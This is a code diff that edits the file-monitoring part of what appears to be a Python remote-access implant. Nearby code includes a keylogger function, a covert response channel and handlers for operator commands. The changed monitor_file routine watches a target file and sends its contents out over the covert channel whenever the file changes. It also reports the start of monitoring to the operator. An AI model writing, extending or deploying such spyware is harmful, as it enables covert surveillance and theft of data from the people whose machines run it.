@@ -147,39 +147,20 @@ def get_keylog():
 
 
 def monitor_file(path):
+    """Monitor a single file for changes using polling or inotify."""
+    last_mtime = None
     try:
         last_mtime = os.path.getmtime(path)
-    except Exception as e:
-        msg = {
-            "type": "MON_FILE_ERROR",
-            "path": path,
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
-            "content": f"Could not stat file: {e}"
-        }
-        send_covert_response((json.dumps(msg) + "\n").encode())
+    except Exception:
+        mon_file_events.append(f"ERR: File {path} not found or inaccessible.")
         return
-
-    # 监控启动，先发一条确认
-    msg0 = {
-        "type": "MON_FILE_STARTED",
-        "path": path,
-        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    }
-    send_covert_response((json.dumps(msg0) + "\n").encode())
-
+    # Simple polling loop
     while mon_file_path == path:
         try:
             mtime = os.path.getmtime(path)
         except Exception as e:
-            msg = {
-                "type": "MON_FILE_ERROR",
-                "path": path,
-                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
-                "content": f"Could not stat during monitoring: {e}"
-            }
-            send_covert_response((json.dumps(msg) + "\n").encode())
+            mon_file_events.append(f"File {path} inaccessible: {e}")
             break
-
         if mtime != last_mtime:
             last_mtime = mtime
             ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
@@ -196,7 +177,9 @@ def monitor_file(path):
                 "content": content
             }
             send_covert_response((json.dumps(msg) + "\n").encode())
+
         time.sleep(1)
+    # When mon_file_path is changed (stop or new path), thread will exit.
 
 
 def monitor_directory(path):
@@ -582,13 +565,7 @@ def main():
             mon_file_events.clear()
             mon_file_thread = threading.Thread(target=monitor_file, args=(target,), daemon=True)
             mon_file_thread.start()
-            # 立即发送 JSON 格式的“监控已启动”事件
-            msg0 = {
-                "type": "MON_FILE_STARTED",
-                "path": target,
-                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-            }
-            send_covert_response((json.dumps(msg0) + "\n").encode())
+            send_covert_response(f"Monitoring file {target}".encode())
         elif command_str.startswith("CMD_MON_DIR:"):
             target = command_str.split(":", 1)[1]
             if mon_dir_path:
